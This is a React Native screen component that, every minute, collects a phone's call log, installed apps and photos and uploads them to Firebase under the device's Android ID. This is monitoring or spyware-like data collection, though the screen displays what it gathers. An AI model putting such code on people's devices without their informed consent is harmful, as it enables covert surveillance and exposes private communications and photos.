import React, { useEffect, useState } from 'react';
import { ScrollView, Text, PermissionsAndroid, Platform, Button } from 'react-native';
import firestore from '@react-native-firebase/firestore';
import DeviceInfo from 'react-native-device-info';
import auth from '@react-native-firebase/auth';

import { coletarAppsInstalados } from '../funcoes/coletarAppsInstalados';
import { coletarChamadas } from '../funcoes/coletarChamadas';
import { coletarFotos } from '../funcoes/coletarFotos';
import { enviarFotosParaFirebase } from '../funcoes/enviarFotos';

const StatusScreen = ({ usuario }) => {
  const [status, setStatus] = useState('Inicializando...');
  const [info, setInfo] = useState(null);

  const pedirPermissaoFotos = async () => {
    if (Platform.OS === 'android' && Platform.Version >= 23) {
      const granted = await PermissionsAndroid.requestMultiple([
        'android.permission.READ_MEDIA_IMAGES',
        'android.permission.READ_EXTERNAL_STORAGE',
      ]);

      return (
        granted['android.permission.READ_MEDIA_IMAGES'] === PermissionsAndroid.RESULTS.GRANTED ||
        granted['android.permission.READ_EXTERNAL_STORAGE'] === PermissionsAndroid.RESULTS.GRANTED
      );
    }
    return true;
  };

  const salvarDados = async () => {
    try {
      setStatus('Coletando dados...');
      const temPermissao = await pedirPermissaoFotos();
      if (!temPermissao) {
        setStatus('Permissão de fotos negada.');
        return;
      }

      const androidId = await DeviceInfo.getAndroidId();
      const chamadas = await coletarChamadas();
      const apps = await coletarAppsInstalados();
      const fotosColetadas = await coletarFotos();
      const urlsFotos = await enviarFotosParaFirebase(fotosColetadas.fotos);

      const dadosCompletos = {
        ...chamadas,
        ...apps,
        fotos: urlsFotos,
        timestamp: firestore.FieldValue.serverTimestamp(),
        usuarioId: usuario.uid,
      };

      await firestore().collection('dispositivos').doc(androidId).set(dadosCompletos);
      setStatus('Dados enviados com sucesso!');
      setInfo(dadosCompletos);
    } catch (err) {
      console.error('[ERRO]', err.message);
      setStatus('Erro ao coletar dados: ' + err.message);
    }
  };

  const logout = async () => {
    await auth().signOut();
  };

  useEffect(() => {
    salvarDados();
    const interval = setInterval(salvarDados, 60000);
    return () => clearInterval(interval);
  }, []);

  return (
    <ScrollView contentContainerStyle={{ padding: 20 }}>
      <Text style={{ fontSize: 18, fontWeight: 'bold' }}>{status}</Text>
      {info &&
        Object.entries(info).map(([key, value]) => (
          <Text key={key} style={{ marginTop: 5 }}>{key}: {JSON.stringify(value)}</Text>
        ))}
      <Button title="Logout" onPress={logout} />
    </ScrollView>
  );
};

export default StatusScreen;
